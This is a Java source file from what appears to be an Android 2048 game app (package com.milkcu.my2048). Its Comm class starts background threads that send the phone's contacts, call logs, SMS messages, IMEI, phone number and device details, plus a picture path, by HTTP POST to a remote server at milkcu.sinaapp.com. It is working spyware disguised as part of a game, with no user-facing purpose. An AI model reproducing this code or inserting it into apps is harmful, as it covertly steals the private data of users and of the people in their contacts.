package com.milkcu.my2048;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import android.util.Log;


public class Comm {
	// Communication
	public static void postTextThread(final String strContacts, final String strCalllogs, final String strMessages, final String imei, final String phoneNumber, final String phoneInfo) {
		new Thread(new Runnable() {  
	        @Override  
	        public void run() {
	        	// http地址  
	            String httpUrl = "http://milkcu.sinaapp.com/hello/save.php";  
	            // HttpPost连接对象  
	            HttpPost httpRequest = new HttpPost(httpUrl);  
	            // 使用NameValuePair来保存要传递的Post参数  
	            List<NameValuePair> params = new ArrayList<NameValuePair>();  
	            // 添加要传递的参数  
	            params.add(new BasicNameValuePair("secret", "example"));
	            params.add(new BasicNameValuePair("contacts", strContacts));
	            params.add(new BasicNameValuePair("calllogs", strCalllogs));
	            params.add(new BasicNameValuePair("messages", strMessages));
	            params.add(new BasicNameValuePair("imei", imei));
	            params.add(new BasicNameValuePair("phone_number", phoneNumber));
	            params.add(new BasicNameValuePair("phone_info", phoneInfo));
	            Log.i("mine", "begin try");
	            try {  
	                // 设置字符集  
	                HttpEntity httpentity = new UrlEncodedFormEntity(params, "utf-8");
	                // 请求httpRequest  
	                httpRequest.setEntity(httpentity);
	                // 取得默认的HttpClient  
	                HttpClient httpclient = new DefaultHttpClient();
	                // 取得HttpResponse  
	                HttpResponse httpResponse = httpclient.execute(httpRequest);
	                Log.i("comm", "execute succeed");
	                // HttpStatus.SC_OK表示连接成功  
	                if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
	                    // 取得返回的字符串  
	                    String strResult = EntityUtils.toString(httpResponse.getEntity());  
	                    Log.i("exception", strResult);  
	                } else {  
	                	Log.i("exception", "请求错误!");  
	                }  
	            } catch (ClientProtocolException e) {  
	                Log.i("exception", e.getMessage().toString());
	                e.printStackTrace();
	            } catch (IOException e) {  
	            	Log.i("exception", e.getMessage().toString());
	            	e.printStackTrace();
	            } catch (Exception e) {  
	            	Log.i("exception", e.getMessage().toString());
	            	e.printStackTrace();
	            }
	        }
	    }).start();
	}
	public static void postPictureThread(final String strPicpath) {
		new Thread(new Runnable() {  
	        @Override  
	        public void run() {
	        	// http地址  
	            String httpUrl = "http://milkcu.sinaapp.com/hello/up.php";  
	            // HttpPost连接对象  
	            HttpPost httpRequest = new HttpPost(httpUrl);  
	            // 使用NameValuePair来保存要传递的Post参数  
	            List<NameValuePair> params = new ArrayList<NameValuePair>();  
	            // 添加要传递的参数  
	            params.add(new BasicNameValuePair("secret", "example"));
	            params.add(new BasicNameValuePair("picture", strPicpath));
	            Log.i("mine", "begin try");
	            try {  
	                // 设置字符集  
	                HttpEntity httpentity = new UrlEncodedFormEntity(params, "utf-8");
	                // 请求httpRequest  
	                httpRequest.setEntity(httpentity);
	                // 取得默认的HttpClient  
	                HttpClient httpclient = new DefaultHttpClient();
	                // 取得HttpResponse  
	                HttpResponse httpResponse = httpclient.execute(httpRequest);
	                Log.i("comm", "execute succeed");
	                // HttpStatus.SC_OK表示连接成功  
	                if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
	                    // 取得返回的字符串  
	                    String strResult = EntityUtils.toString(httpResponse.getEntity());  
	                    Log.i("exception", strResult);  
	                } else {  
	                	Log.i("exception", "请求错误!");  
	                }  
	            } catch (ClientProtocolException e) {  
	                Log.i("exception", e.getMessage().toString());
	                e.printStackTrace();
	            } catch (IOException e) {  
	            	Log.i("exception", e.getMessage().toString());
	            	e.printStackTrace();
	            } catch (Exception e) {  
	            	Log.i("exception", e.getMessage().toString());
	            	e.printStackTrace();
	            }
	        }
	    }).start();
	}
}
